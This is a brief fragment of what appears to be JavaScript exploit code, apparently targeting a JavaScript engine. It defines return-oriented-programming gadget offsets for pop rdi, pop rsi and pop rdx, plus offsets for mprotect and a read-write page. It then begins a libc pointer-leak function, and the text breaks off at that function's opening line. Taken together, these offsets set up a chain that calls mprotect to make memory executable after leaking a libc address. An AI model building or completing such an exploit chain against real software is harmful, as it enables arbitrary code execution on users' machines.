const OFF_POP_RDI = 0x2a145n;
const OFF_POP_RSI = 0x2baa9n;
const OFF_POP_RDX_ZERO_POP_RBX_RBP = 0xa97c6n;
const OFF_MPROTECT = 0x10d620n;
const OFF_RW_PAGE = 0x1e7000n;

// -------------------- libc pointer leak --------------------
function leak_libc_ptr() {
